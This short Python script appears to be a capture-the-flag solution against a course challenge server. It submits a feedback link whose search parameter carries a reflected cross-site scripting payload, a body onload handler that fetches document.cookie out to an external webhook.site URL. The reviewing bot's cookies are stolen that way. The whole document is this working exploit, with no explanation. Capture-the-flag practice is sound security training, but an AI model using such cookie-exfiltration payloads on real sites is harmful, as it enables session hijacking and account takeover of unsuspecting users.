import requests
from requests.utils import quote

SERVER = "http://ssof2526.challenges.cwte.me"
PORT = 25252

link = f"{SERVER}:{PORT}"
webhook = "https://webhook.site/901848de-a767-450a-98da-1e45d0b33a95"

s = requests.Session()

payload = f'<body onload=fetch("{webhook}?=cookie="+document.cookie)>'

data = {"feedback_link": link + "/?search=" + quote(payload)}

s.post(f'{link}/submit_feedback', data=data)
